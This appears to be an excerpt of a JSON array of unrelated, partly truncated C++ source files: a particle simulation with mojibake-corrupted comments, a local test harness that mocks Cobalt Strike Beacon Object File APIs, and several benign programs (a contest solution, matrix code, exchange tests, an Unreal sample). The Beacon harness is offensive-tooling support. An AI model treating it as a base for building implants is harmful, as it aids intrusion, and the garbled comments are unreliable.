\u00ef\u00ee\u00e2\u00ee\u00f0\u00ee\u00f2\u00e0\r\n\r\n    // \u00cf\u00f0\u00ee\u00f1\u00f2\u00e0\u00ff \u00ef\u00f0\u00ee\u00e5\u00ea\u00f6\u00e8\u00ff \u00ef\u00e5\u00f0\u00f1\u00ef\u00e5\u00ea\u00f2\u00e8\u00e2\u00fb (\u00ec\u00ee\u00e6\u00ed\u00ee \u00f3\u00eb\u00f3\u00f7\u00f8\u00e8\u00f2\u00fc)\r\n    float perspectiveScale = 1.0f / (1.0f + rotatedZ / 500.0f);\r\n    int screenX = static_cast<int>(rotatedX * perspectiveScale + WIDTH / 2);\r\n    int screenY = static_cast<int>(y * perspectiveScale + HEIGHT / 2);\r\n    int screenRadius = static_cast<int>(radius * perspectiveScale);\r\n\r\n    for (int dy = -screenRadius; dy <= screenRadius; ++dy) {\r\n        for (int dx = -screenRadius; dx <= screenRadius; ++dx) {\r\n            if (dx * dx + dy * dy <= screenRadius * screenRadius) {\r\n                SDL_SetRenderDrawColor(renderer, r, g, b, a);\r\n                SDL_RenderDrawPoint(renderer, screenX + dx, screenY + dy);\r\n            }\r\n        }\r\n    }\r\n}\r\n\r\n// \u00ca\u00eb\u00e0\u00f1\u00f1 \u00f7\u00e0\u00f1\u00f2\u00e8\u00f6\u00fb (\u00e4\u00ee\u00e1\u00e0\u00e2\u00eb\u00e5\u00ed z)\r\nclass Particle {\r\npublic:\r\n    float x;\r\n    float y;\r\n    float z; // \u00cd\u00ee\u00e2\u00e0\u00ff \u00ea\u00ee\u00ee\u00f0\u00e4\u00e8\u00ed\u00e0\u00f2\u00e0\r\n    float vx;\r\n    float vy;\r\n    float vz; // \u00cd\u00ee\u00e2\u00e0\u00ff \u00f1\u00ea\u00ee\u00f0\u00ee\u00f1\u00f2\u00fc\r\n    float density;\r\n    float pressure;\r\n    std::vector<Particle*> near_particles;\r\n    bool grabbed;\r\n\r\n    Particle(float x, float y, float z) : x(x), y(y), z(z), vx(0), vy(0), vz(0), density(0), pressure(0), grabbed(false) {}\r\n\r\n    void update() {\r\n        vy += GRAVITY;\r\n        x += vx;\r\n        y += vy;\r\n        z += vz; // \u00ce\u00e1\u00ed\u00ee\u00e2\u00eb\u00e5\u00ed\u00e8\u00e5 z\r\n\r\n        // \u00d1\u00f2\u00ee\u00eb\u00ea\u00ed\u00ee\u00e2\u00e5\u00ed\u00e8\u00ff \u00f1 \u00e3\u00f0\u00e0\u00ed\u00e8\u00f6\u00e0\u00ec\u00e8 (\u00ea\u00f3\u00e1)\r\n        if (x < PARTICLE_RADIUS + PAD_X) {\r\n            x = PARTICLE_RADIUS + PAD_X;\r\n            vx *= -0.7f;\r\n        }\r\n        else if (x > WIDTH - PARTICLE_RADIUS - PAD_X) {\r\n            x = WIDTH - PARTICLE_RADIUS - PAD_X;\r\n            vx *= -0.7f;\r\n        }\r\n\r\n        if (y > HEIGHT - PARTICLE_RADIUS - PAD_Y) {\r\n            y = HEIGHT - PARTICLE_RADIUS - PAD_Y;\r\n            vy *= -0.7f;\r\n        }\r\n        // \u00c4\u00ee\u00e1\u00e0\u00e2\u00eb\u00e5\u00ed\u00fb \u00ee\u00e3\u00f0\u00e0\u00ed\u00e8\u00f7\u00e5\u00ed\u00e8\u00ff \u00ef\u00ee z\r\n        if (z < PARTICLE_RADIUS + PAD_Z) {\r\n            z = PARTICLE_RADIUS + PAD_Z;\r\n            vz *= -0.7f;\r\n        }\r\n        else if (z > 400 - PARTICLE_RADIUS - PAD_Z) { // \u00cf\u00f0\u00e5\u00e4\u00ef\u00ee\u00eb\u00e0\u00e3\u00e0\u00e5\u00ec\u00e0\u00ff \u00ec\u00e0\u00ea\u00f1\u00e8\u00ec\u00e0\u00eb\u00fc\u00ed\u00e0\u00ff \u00e3\u00eb\u00f3\u00e1\u00e8\u00ed\u00e0\r\n            z = 400 - PARTICLE_RADIUS - PAD_Z;\r\n            vz *= -0.7f;\r\n        }\r\n\r\n\r\n        // \u00d1\u00f2\u00ee\u00eb\u00ea\u00ed\u00ee\u00e2\u00e5\u00ed\u00e8\u00e5 \u00f1 \u00ef\u00f0\u00e5\u00ef\u00ff\u00f2\u00f1\u00f2\u00e2\u00e8\u00e5\u00ec (\u00f1\u00f4\u00e5\u00f0\u00e0)\r\n        float dx = x - OBSTACLE_X;\r\n        float dy = y - OBSTACLE_Y;\r\n        float dz = z - OBSTACLE_Z;\r\n        float distance_to_obstacle_sq = dx * dx + dy * dy + dz * dz; // 3D \u00f0\u00e0\u00f1\u00f1\u00f2\u00ee\u00ff\u00ed\u00e8\u00e5\r\n        float radius_sum_sq = (PARTICLE_RADIUS + OBSTACLE_RADIUS) * (PARTICLE_RADIUS + OBSTACLE_RADIUS);\r\n\r\n        if (distance_to_obstacle_sq < radius_sum_sq) {\r\n            float distance_to_obstacle = ",
    "#include <iostream>\n#include <cstdio>\n#include <vector>\n#include <algorithm>\n#include <utility>\n#include <cstring>\n#include <map>\n#include <Windows.h>\n\n#include \"mock.h\"\n#include \"..\\beacon_user_data.h\"\n\nextern \"C\" {\n#ifdef _DEBUG\n#undef DECLSPEC_IMPORT\n#define DECLSPEC_IMPORT\n#endif\n#include \"..\\beacon.h\"\n}\n\nnamespace bof {\n    namespace utils {\n        template <typename T>\n        T swapEndianness(T value) {\n            char *ptr = reinterpret_cast<char *>(&value);\n            std::reverse(ptr, ptr + sizeof(T));\n            return value;\n        }\n\n        template <typename T>\n        std::vector<char> toBytes(T input) {\n            char *ptr = reinterpret_cast<char *>(&input);\n            return std::vector<char>(ptr, ptr + sizeof(T));\n        }\n\n        const char* typeToStr(int callbackType) {\n            switch (callbackType) {\n                case CALLBACK_OUTPUT: return \"CALLBACK_OUTPUT\";\n                case CALLBACK_OUTPUT_OEM: return \"CALLBACK_OUTPUT_OEM\";\n                case CALLBACK_ERROR: return \"CALLBACK_ERROR\";\n                case CALLBACK_OUTPUT_UTF8: return \"CALLBACK_OUTPUT_UTF8\";\n                default: return \"CALLBACK_UNKOWN\";\n            }\n        }\n    }\n\n    namespace mock {\n        char *BofData::get() {\n            return size() > 0 ? reinterpret_cast<char *>(&data[0]) : nullptr;\n        }\n\n        int BofData::size() {\n            return data.size();\n        }\n\n        void BofData::addData(const char *buf, std::size_t len) {\n            std::vector<char> bytes;\n            bytes.assign(buf, buf + len);\n            insert(static_cast<int>(len));\n            append(bytes);\n        }\n\n        void BofData::append(const std::vector<char> &data) {\n            this->data.insert(std::end(this->data), std::begin(data), std::end(data));\n        }\n\n        void BofData::insert(int v) {\n            append(bof::utils::toBytes(bof::utils::swapEndianness(v)));\n        }\n\n        void BofData::insert(short v) {\n            append(bof::utils::toBytes(bof::utils::swapEndianness(v)));\n        }\n\n        void BofData::insert(unsigned int v) {\n            insert(static_cast<int>(v));\n        }\n\n        void BofData::insert(unsigned short v) {\n            insert(static_cast<short>(v));\n        }\n\n        void BofData::insert(const char *v) {\n            addData(v, std::strlen(v) + 1);\n        }\n\n        void BofData::insert(const wchar_t *v) {\n            addData((const char *)v, (std::wcslen(v) + 1) * sizeof(wchar_t));\n        }\n\n        void BofData::insert(const std::vector<char>& data) {\n            pack<int32_t>(data.size());\n            append(data);\n        }\n    }\n\n    namespace output {\n        std::vector<OutputEntry> outputs;\n\n        void addEntry(int type, const char* data, int len) {\n            OutputEntry output = {\n                type,\n                std::string(data, data + len)\n            };\n            outputs.push_back(output);\n        }\n\n        const std::vector<OutputEntry>& getOutputs() {\n            return outputs;\n        }\n\n        void reset() {\n            outputs.clear();\n        }\n\n        void PrintTo(const OutputEntry& o, std::ostream* os) {\n            *os << \"{ callbackType: \" << bof::utils::typeToStr(o.callbackType) << \", output: \" << o.output << \" }\";\n        }\n    }\n\n    namespace valuestore {\n        std::map<std::string, void*> values;\n\n        void reset() {\n            values.clear();\n        }\n    }\n\n    namespace bud {\n        char custom[BEACON_USER_DATA_CUSTOM_SIZE] = { 0 };\n\n        void reset() {\n            std::memset(custom, 0, BEACON_USER_DATA_CUSTOM_SIZE);\n        }\n\n        void set(const char* data) {\n            if (data) {\n                std::memcpy(custom, data, BEACON_USER_DATA_CUSTOM_SIZE);\n            }\n        }\n    }\n}\n\nextern \"C\"\n{\n    // Print API\n    void BeaconPrintf(int type, char *fmt, ...) {\n        printf(\"[Output Callback: %s (0x%X)]\\n\", bof::utils::typeToStr(type), type);\n        va_list args;\n        va_start(args, fmt);\n        int size = vsnprintf(nullptr, 0, fmt, args);\n        if (size >= 0) {\n            char* buffer = new char[size + 1];\n            vsnprintf(buffer, size + 1, fmt, args);\n            bof::output::addEntry(type, buffer, size);\n            delete[] buffer;\n        }\n        vprintf(fmt, args);\n        printf(\"\\n\");\n        va_end(args);\n    }\n\n    void BeaconOutput(int type, char *data, int len) {\n        bof::output::addEntry(type, data, len);\n        printf(\"[Output Callback: %s (0x%X)]\\n%.*s\", bof::utils::typeToStr(type), type, len, data);\n    }\n\n    // Parser API\n    void BeaconDataParse(datap *parser, char *buffer, int size) {\n        parser->buffer = buffer;\n        parser->original = buffer;\n        parser->size = size;\n        parser->length = size;\n    }\n\n    int BeaconDataInt(datap *parser) {\n        int value = *(int *)(parser->buffer);\n        parser->buffer += sizeof(int);\n        parser->length -= sizeof(int);\n        return bof::utils::swapEndianness(value);\n    }\n\n    short BeaconD",
    "#include <iostream>\n#include <vector>\n#include <string>\n#include <regex>\n#include <sstream>\n#include <algorithm>\n#include <cmath>\n#include <unordered_set>\n#include <list>\n#include <stdio.h>\n#include <ctype.h>\n#include <cstring>\n#include <cctype>\n#include <iomanip>\n#include <climits>\n#include <functional>\n#include <cstdlib>\n#include <ctime>\n#include <cstdio>\n#include <stack>\n#include <queue>\n#include <deque>\n#include <map>\n#include <set>\n#include <bitset>\n#include <complex>\n#include <random>\n\nusing namespace std;\ntypedef long long ll;\n// Problem URL: https://dmoj.ca/problem/ccc14s3\n\nint main() {\n    int T; cin >> T;\n    for (int i = 0; i < T; i++) {\n        ll N; cin >> N; ll counter = 1;\n        stack <ll> st, initial; bool check = true;\n        for (int i = 1; i <= N; i++) {\n            ll a; cin >> a; initial.push(a);\n        }\n        while (counter <= N) {\n            if (initial.top() == counter) {\n                counter++;\n                if (!st.empty()) {\n                    while (!st.empty() and st.top() == counter ) {\n                        st.pop(); counter++;\n                    }\n                }\n                \n            }\n            else if (st.empty()) st.push(initial.top());\n            else {\n                if (initial.top() < st.top()) {\n                    st.push(initial.top());\n                } else {\n                    check = false; break;\n                }\n            }\n            initial.pop();\n            if (!check) break;\n        }\n        if (check) cout << \"Y\\n\";\n        else cout << \"N\\n\";\n    }\n}\n",
    "#include \"trainV.hpp\"\n\nint main() {\n\n    std::cout << \"# vAI NLP model version 1.0.4\\n\\nTraining [ in progress ]\\n * This task may take up to 20 minutes\\n\";\n\n    std::vector<std::string> trainingData = {\n        \"I\", \"went\", \"to\", \"the\", \"store\", \"to\", \"buy\", \"some\", \"groceries\", \"The\", \"weather\", \"is\", \"nice\", \"today\", \"Let's\", \"go\", \"for\", \"a\", \"walk\",\n        \"I\", \"love\", \"spending\", \"time\", \"with\", \"my\", \"family\", \"She\", \"is\", \"reading\", \"a\", \"book\", \"He\", \"is\", \"playing\", \"the\", \"guitar\",\n        \"They\", \"are\", \"watching\", \"a\", \"movie\", \"We\", \"are\", \"having\", \"dinner\", \"together\", \"I\", \"have\", \"a\", \"meeting\", \"at\", \"work\", \"tomorrow\",\n        \"Can\", \"you\", \"pass\", \"me\", \"the\", \"salt\", \"What\", \"did\", \"you\", \"do\", \"yesterday\", \"I\", \"went\", \"for\", \"a\", \"run\", \"in\", \"the\", \"morning\",\n        \"He\", \"is\", \"working\", \"on\", \"a\", \"new\", \"project\", \"She\", \"is\", \"taking\", \"a\", \"nap\", \"The\", \"kids\", \"are\", \"playing\", \"in\", \"the\", \"park\",\n        \"I\", \"need\", \"to\", \"go\", \"to\", \"the\", \"bank\", \"today\", \"Do\", \"you\", \"want\", \"to\", \"come\", \"with\", \"me\", \"We\", \"are\", \"planning\", \"a\", \"trip\",\n        \"next\", \"month\", \"She\", \"is\", \"baking\", \"cookies\", \"right\", \"now\", \"He\", \"is\", \"fixing\", \"his\", \"car\", \"I\", \"am\", \"learning\", \"to\", \"play\",\n        \"the\", \"piano\", \"They\", \"are\", \"building\", \"a\", \"new\", \"house\", \"We\", \"are\", \"going\", \"to\", \"the\", \"beach\", \"this\", \"weekend\", \"She\", \"is\",\n        \"studying\", \"for\", \"her\", \"exams\", \"He\", \"is\", \"writing\", \"a\", \"letter\", \"to\", \"his\", \"friend\", \"I\", \"am\", \"looking\", \"for\", \"a\", \"new\",\n        \"job\", \"They\", \"are\", \"cleaning\", \"the\", \"house\", \"We\", \"are\", \"decorating\", \"the\", \"Christmas\", \"tree\", \"She\", \"is\", \"knitting\", \"a\",\n        \"scarf\", \"He\", \"is\", \"drawing\", \"a\", \"picture\", \"I\", \"am\", \"reading\", \"the\", \"news\", \"They\", \"are\", \"discussing\", \"a\", \"new\", \"idea\",\n        \"We\", \"are\", \"celebrating\", \"our\", \"anniversary\", \"She\", \"is\", \"watching\", \"her\", \"favorite\", \"show\", \"He\", \"is\", \"repairing\", \"the\",\n        \"fence\", \"I\", \"am\", \"writing\", \"a\", \"report\", \"for\", \"work\", \"They\", \"are\", \"playing\", \"a\", \"board\", \"game\", \"We\", \"are\", \"hosting\",\n        \"a\", \"dinner\", \"party\", \"She\", \"is\", \"planting\", \"flowers\", \"in\", \"the\", \"garden\", \"He\", \"is\", \"painting\", \"the\", \"walls\", \"I\", \"am\",\n        \"making\", \"a\", \"birthday\", \"cake\", \"They\", \"are\", \"shopping\", \"for\", \"new\", \"clothes\", \"We\", \"are\", \"going\", \"to\", \"a\", \"concert\",\n        \"She\", \"is\", \"organizing\", \"her\", \"closet\", \"He\", \"is\", \"taking\", \"out\", \"the\", \"trash\", \"I\", \"am\", \"checking\", \"my\", \"email\",\n        \"We\", \"are\", \"visiting\", \"our\", \"grandparents\", \"this\", \"weekend\", \"She\", \"is\", \"making\", \"a\", \"scrapbook\", \"He\", \"is\", \"washing\", \"the\", \"dishes\",\n        \"I\", \"am\", \"learning\", \"to\", \"speak\", \"Spanish\", \"They\", \"are\", \"attending\", \"a\", \"wedding\", \"We\", \"are\", \"going\", \"to\", \"the\", \"zoo\",\n        \"She\", \"is\", \"playing\", \"tennis\", \"He\", \"is\", \"building\", \"a\", \"model\", \"airplane\", \"I\", \"am\", \"volunteering\", \"at\", \"the\", \"animal\", \"shelter\",\n        \"They\", \"are\", \"going\", \"on\", \"a\", \"road\", \"trip\", \"We\", \"are\", \"having\", \"a\", \"barbecue\", \"She\", \"is\", \"taking\", \"a\", \"photography\", \"class\",\n        \"He\", \"is\", \"learning\", \"to\", \"cook\", \"I\", \"am\", \"going\", \"to\", \"the\", \"gym\", \"They\", \"are\", \"watching\", \"the\", \"sunset\", \"We\", \"are\", \"making\",\n        \"a\", \"time\", \"capsule\", \"She\", \"is\", \"writing\", \"a\", \"poem\", \"He\", \"is\", \"fixing\", \"the\", \"leaky\", \"faucet\", \"I\", \"am\", \"gardening\", \"They\", \"are\",\n        \"playing\", \"video\", \"games\", \"We\", \"are\", \"going\", \"to\", \"a\", \"picnic\", \"She\", \"is\", \"learning\", \"to\", \"sew\", \"He\", \"is\", \"painting\", \"a\", \"mural\",\n        \"I\", \"am\", \"writing\", \"a\", \"novel\", \"They\", \"are\", \"going\", \"camping\", \"We\", \"are\", \"flying\", \"kites\", \"She\", \"is\", \"taking\", \"a\", \"dance\", \"class\",\n        \"He\", \"is\", \"building\", \"a\", \"treehouse\", \"I\", \"am\", \"going\", \"to\", \"the\", \"library\", \"They\", \"are\", \"watching\", \"a\", \"play\", \"We\", \"are\", \"having\",\n        \"a\", \"game\", \"night\", \"She\", \"is\", \"learning\", \"to\", \"play\", \"the\", \"violin\", \"He\", \"is\", \"fixing\", \"the\", \"bike\", \"I\", \"am\", \"baking\", \"bread\",\n        \"They\", \"are\", \"watching\", \"the\", \"stars\", \"We\", \"are\", \"making\", \"a\", \"video\", \"She\", \"is\", \"drawing\", \"a\", \"portrait\", \"He\", \"is\", \"repairing\",\n        \"the\", \"roof\", \"I\", \"am\", \"writing\", \"a\", \"song\", \"They\", \"are\", \"going\", \"hiking\", \"We\", \"are\", \"having\", \"a\", \"movie\", \"marathon\", \"She\", \"is\",\n        \"learning\", \"to\", \"knit\", \"He\", \"is\", \"painting\", \"the\", \"garage\", \"I\", \"am\", \"going\", \"for\", \"a\", \"swim\", \"They\", \"are\", \"playing\", \"chess\",\n        \"We\", \"are\", \"making\", \"a\", \"puzzle\", \"She\", \"is\", \"writing\", \"a\", \"letter\", \"He\", \"is\", \"fixing\", \"the\", \"car\", \"I\", \"am\", \"learning\", \"to\",\n        \"play\", \"the\", \"guitar\", \"They\", \"are\", \"watching\", \"a\", \"documentary\", \"We\", \"are\", \"having\", \"a\", \"potluck\", \"She\", \"is\", \"taking\", \"a\",\n        \"singing\", \"class\", \"He\", \"is\", \"building\", \"a\", \"shed\", \"I\", \"am\", \"going\", \"to\", \"the\", \"spa\", \"They\", \"are\", \"watching\", \"the\", \"birds\",\n        \"We\", \"are\", \"making\", \"a\", \"sandc",
    "#include <iostream>\nusing namespace std;\n\nvoid inputMatrix(int matrix[3][3], const string &name) \n{\n    cout << \"Enter elements of matrix \" << name << \"\\n\";\n    for (int i = 0; i < 3; ++i) \n    {\n        for (int j = 0; j < 3; ++j) \n        {\n            cin >> matrix[i][j];\n        }\n    }\n}\n\nvoid multiplyMatrices(int matrix1[3][3], int matrix2[3][3], int result[3][3]) \n{\n    for (int i = 0; i < 3; ++i) \n    {\n        for (int j = 0; j < 3; ++j) \n        {\n            result[i][j] = 0;\n            for (int k = 0; k < 3; ++k) \n            {\n                result[i][j] += matrix1[i][k] * matrix2[k][j];\n            }\n        }\n    }\n}\n\nvoid printMatrix(int matrix[3][3], const string &name) \n{\n    cout << \"Matrix \" << name << \":\\n\";\n    for (int i = 0; i < 3; ++i) \n    {\n        for (int j = 0; j < 3; ++j) \n        {\n            cout << matrix[i][j] << \" \";\n        }\n        cout << endl;\n    }\n}\n\nint main() \n{\n    int matrix1[3][3], matrix2[3][3], result[3][3];\n\n    inputMatrix(matrix1, \"A\");\n    inputMatrix(matrix2, \"B\");\n\n    multiplyMatrices(matrix1, matrix2, result);\n\n    printMatrix(matrix1, \"A\");\n    printMatrix(matrix2, \"B\");\n    printMatrix(result, \"Result\");\n\n    return 0;\n}\n",
    "#include \"modules/exchange.hpp\"\n#include \"modules/wallet.hpp\"\n#include \"precompiled.hpp\"\n#include <SQLiteCpp/SQLiteCpp.h>\n#include <gtest/gtest.h>\n\nusing namespace exchange;\n\nTEST(Exchange, MakeRequest_Test)\n{\n    SQLite::Database test_db(\"test.db\", SQLite::OPEN_READWRITE | SQLite::OPEN_CREATE);\n\n    {\n        SQLite::Statement statement(test_db, \"DROP TABLE IF EXISTS requests\");\n        ASSERT_EQ(statement.exec(), SQLite::OK);\n    }\n\n    modules::Exchange exchange(test_db, std::nullopt);\n\n    ASSERT_TRUE(exchange.make_request(1, \"USD/RUB\", 50, 62, modules::RequestType::Buy));\n    ASSERT_TRUE(exchange.make_request(2, \"USD/RUB\", 40, 70, modules::RequestType::Sell));\n    ASSERT_TRUE(exchange.make_request(3, \"USD/RUB\", 120, 100, modules::RequestType::Sell));\n\n    {\n        SQLite::Statement statement(test_db, \"SELECT currency, amount, price, request_type FROM requests WHERE id = 1\");\n        ASSERT_TRUE(statement.executeStep());\n        ASSERT_EQ(statement.getColumn(0).getString(), \"USD/RUB\");\n        ASSERT_EQ(statement.getColumn(1).getDouble(), 50);\n        ASSERT_EQ(statement.getColumn(2).getDouble(), 62);\n        ASSERT_EQ(statement.getColumn(3).getUInt(), static_cast<uint32_t>(modules::RequestType::Buy));\n    }\n}\n\nTEST(Exchange, RemoveRequest_Test)\n{\n    SQLite::Database test_db(\"test.db\", SQLite::OPEN_READWRITE | SQLite::OPEN_CREATE);\n\n    {\n        SQLite::Statement statement(test_db, \"DROP TABLE IF EXISTS requests\");\n        ASSERT_EQ(statement.exec(), SQLite::OK);\n    }\n\n    modules::Exchange exchange(test_db, std::nullopt);\n\n    ASSERT_TRUE(exchange.make_request(1, \"USD/RUB\", 50, 62, modules::RequestType::Buy));\n    ASSERT_TRUE(exchange.make_request(2, \"USD/RUB\", 40, 70, modules::RequestType::Sell));\n    ASSERT_TRUE(exchange.make_request(3, \"USD/RUB\", 120, 100, modules::RequestType::Sell));\n\n    {\n        SQLite::Statement statement(test_db, \"SELECT * FROM requests\");\n        for (uint32_t const i : std::views::iota(0u, 3u))\n        {\n            ASSERT_TRUE(statement.executeStep());\n        }\n    }\n\n    ASSERT_TRUE(exchange.remove_request(1));\n\n    {\n        SQLite::Statement statement(test_db, \"SELECT * FROM requests\");\n        for (uint32_t const i : std::views::iota(0u, 2u))\n        {\n            ASSERT_TRUE(statement.executeStep());\n        }\n    }\n}\n\nTEST(Exchange, ProcessEqRequests_Test)\n{\n    SQLite::Database test_db(\"test.db\", SQLite::OPEN_READWRITE | SQLite::OPEN_CREATE);\n\n    {\n        SQLite::Statement statement(test_db, \"DROP TABLE IF EXISTS requests\");\n        ASSERT_EQ(statement.exec(), SQLite::OK);\n    }\n\n    modules::Exchange exchange(test_db, std::nullopt);\n\n    {\n        SQLite::Statement statement(test_db, \"DROP TABLE IF EXISTS wallets\");\n        ASSERT_EQ(statement.exec(), SQLite::OK);\n    }\n\n    {\n        SQLite::Statement statement(test_db, \"DROP TABLE IF EXISTS transactions\");\n        ASSERT_EQ(statement.exec(), SQLite::OK);\n    }\n\n    modules::Wallet wallet(test_db, std::nullopt);\n\n    for (uint32_t const i : std::views::iota(1u, 6u))\n    {\n        uint64_t new_wallet_id;\n        ASSERT_TRUE(wallet.create_wallet(i, \"RUB\", new_wallet_id));\n        ASSERT_TRUE(wallet.create_wallet(i, \"USD\", new_wallet_id));\n    }\n\n    ASSERT_TRUE(exchange.make_request(1, \"USD/RUB\", 50, 62, modules::RequestType::Sell));\n    ASSERT_TRUE(exchange.make_request(2, \"USD/RUB\", 50, 63, modules::RequestType::Buy));\n    ASSERT_TRUE(exchange.make_request(3, \"USD/RUB\", 50, 64, modules::RequestType::Buy));\n    ASSERT_TRUE(exchange.make_request(4, \"USD/RUB\", 50, 60, modules::RequestType::Buy));\n    ASSERT_TRUE(exchange.make_request(5, \"USD/RUB\", 50, 61, modules::RequestType::Sell));\n\n    exchange.process_requests(wallet);\n\n    // Withdraw Testing\n    {\n        SQLite::Statement statement(\n            test_db, \"SELECT wallets.user_id AS user_id, amount FROM transactions \"\n                     \"INNER JOIN wallets ON transactions.wallet_id = wallets.id WHERE transaction_type = 0\");\n\n        // User (id: 3)\n        ASSERT_TRUE(statement.executeStep());\n\n        ASSERT_EQ(statement.getColumn(0).getInt64(), 3);\n        ASSERT_EQ(statement.getColumn(1).getDouble(), 50 * 64);\n\n        // User (id: 5)\n        ASSERT_TRUE(statement.executeStep());\n\n        ASSERT_EQ(statement.getColumn(0).getInt64(), 5);\n        ASSERT_EQ(statement.getColumn(1).getDouble(), 50);\n\n        // User (id: 2)\n        ASSERT_TRUE(statement.executeStep());\n\n        ASSERT_EQ(statement.getColumn(0).getInt64(), 2);\n        ASSERT_EQ(statement.getColumn(1).getDouble(), 50 * 63);\n\n        // User (id: 1)\n        ASSERT_TRUE(statement.executeStep());\n\n        ASSERT_EQ(statement.getColumn(0).getInt64(), 1);\n        ASSERT_EQ(statement.getColumn(1).getDouble(), 50);\n    }\n\n    // Deposit Testing\n    {\n        SQLite::Statement statement(\n            test_db, \"SELECT wallets.user_id AS user_id, amount FROM transactions \"\n                     \"INNER JOIN wallets ON transactions.wallet_id = wallets.id WHERE transaction_type = 1\");\n\n        // User (id",
    "// Copyright Epic Games, Inc. All Rights Reserved.\n\n#include \"AISampleCharacter.h\"\n#include \"HeadMountedDisplayFunctionLibrary.h\"\n#include \"Camera/CameraComponent.h\"\n#include \"Components/CapsuleComponent.h\"\n#include \"Components/InputComponent.h\"\n#include \"GameFramework/CharacterMovementComponent.h\"\n#include \"GameFramework/Controller.h\"\n#include \"GameFramework/SpringArmComponent.h\"\n\n//////////////////////////////////////////////////////////////////////////\n// AAISampleCharacter\n\nAAISampleCharacter::AAISampleCharacter()\n{\n\t// Set size for collision capsule\n\tGetCapsuleComponent()->InitCapsuleSize(42.f, 96.0f);\n\n\t// set our turn rates for input\n\tBaseTurnRate = 45.f;\n\tBaseLookUpRate = 45.f;\n\n\t// Don't rotate when the controller rotates. Let that just affect the camera.\n\tbUseControllerRotationPitch = false;\n\tbUseControllerRotationYaw = false;\n\tbUseControllerRotationRoll = false;\n\n\t// Configure character movement\n\tGetCharacterMovement()->bOrientRotationToMovement = true; // Character moves in the direction of input...\t\n\tGetCharacterMovement()->RotationRate = FRotator(0.0f, 540.0f, 0.0f); // ...at this rotation rate\n\tGetCharacterMovement()->JumpZVelocity = 600.f;\n\tGetCharacterMovement()->AirControl = 0.2f;\n\n\t// Create a camera boom (pulls in towards the player if there is a collision)\n\tCameraBoom = CreateDefaultSubobject<USpringArmComponent>(TEXT(\"CameraBoom\"));\n\tCameraBoom->SetupAttachment(RootComponent);\n\tCameraBoom->TargetArmLength = 300.0f; // The camera follows at this distance behind the character\t\n\tCameraBoom->bUsePawnControlRotation = true; // Rotate the arm based on the controller\n\n\t// Create a follow camera\n\tFollowCamera = CreateDefaultSubobject<UCameraComponent>(TEXT(\"FollowCamera\"));\n\tFollowCamera->SetupAttachment(CameraBoom, USpringArmComponent::SocketName); // Attach the camera to the end of the boom and let the boom adjust to match the controller orientation\n\tFollowCamera->bUsePawnControlRotation = false; // Camera does not rotate relative to arm\n\n\t// Note: The skeletal mesh and anim blueprint references on the Mesh component (inherited from Character) \n\t// are set in the derived blueprint asset named MyCharacter (to avoid direct content references in C++)\n}\n\n//////////////////////////////////////////////////////////////////////////\n// Input\n\nvoid AAISampleCharacter::SetupPlayerInputComponent(class UInputComponent* PlayerInputComponent)\n{\n\t// Set up gameplay key bindings\n\tcheck(PlayerInputComponent);\n\tPlayerInputComponent->BindAction(\"Jump\", IE_Pressed, this, &ACharacter::Jump);\n\tPlayerInputComponent->BindAction(\"Jump\", IE_Released, this, &ACharacter::StopJumping);\n\n\tPlayerInputComponent->BindAxis(\"MoveForward\", this, &AAISampleCharacter::MoveForward);\n\tPlayerInputComponent->BindAxis(\"MoveRight\", this, &AAISampleCharacter::MoveRight);\n\n\t// We have 2 versions of the rotation bindings to handle different kinds of devices differently\n\t// \"turn\" handles devices that provide an absolute delta, such as a mouse.\n\t// \"turnrate\" is for devices that we choose to treat as a rate of change, such as an analog joystick\n\tPlayerInputComponent->BindAxis(\"Turn\", this, &APawn::AddControllerYawInput);\n\tPlayerInputComponent->BindAxis(\"TurnRate\", this, &AAISampleCharacter::TurnAtRate);\n\tPlayerInputComponent->BindAxis(\"LookUp\", this, &APawn::AddControllerPitchInput);\n\tPlayerInputComponent->BindAxis(\"LookUpRate\", this, &AAISampleCharacter::LookUpAtRate);\n\n\t// handle touch devices\n\tPlayerInputComponent->BindTouch(IE_Pressed, this, &AAISampleCharacter::TouchStarted);\n\tPlayerInputComponent->BindTouch(IE_Released, this, &AAISampleCharacter::TouchStopped);\n\n\t// VR headset functionality\n\tPlayerInputComponent->BindAction(\"ResetVR\", IE_Pressed, this, &AAISampleCharacter::OnResetVR);\n}\n\n\nvoid AAISampleCharacter::OnResetVR()\n{\n\t// If AISample is added to a project via 'Add Feature' in the Unreal Editor the dependency on HeadMountedDisplay in AISample.Build.cs is not automatically propagated\n\t// and a linker error will result.\n\t// You will need to either:\n\t//\t\tAdd \"HeadMountedDisplay\" to [YourProject].Build.cs PublicDependencyModuleNames in order to build successfully (appropriate if supporting VR).\n\t// or:\n\t//\t\tComment or delete the call to ResetOrientationAndPosition below (appropriate if not supporting VR)\n\tUHeadMountedDisplayFunctionLibrary::ResetOrientationAndPosition();\n}\n\nvoid AAISampleCharacter::TouchStarted(ETouchIndex::Type FingerIndex, FVector Location)\n{\n\t\tJump();\n}\n\nvoid AAISampleCharacter::TouchStopped(ETouchIndex::Type FingerIndex, FVector Location)\n{\n\t\tStopJumping();\n}\n\nvoid AAISampleCharacter::TurnAtRate(float Rate)\n{\n\t// calculate delta for this frame from the rate information\n\tAddControllerYawInput(Rate * BaseTurnRate * GetWorld()->GetDeltaSeconds());\n}\n\nvoid AAISampleCharacter::LookUpAtRate(float Rate)\n{\n\t// calculate delta for this frame from the rate information\n\tAddControllerPitchInput(Rate * BaseLookUpRate * GetWorld()->GetDeltaSeconds());\n}\n\nvoid AAISampleCharacter::MoveForward(float Value)\n{\n\tif ((Controller ",
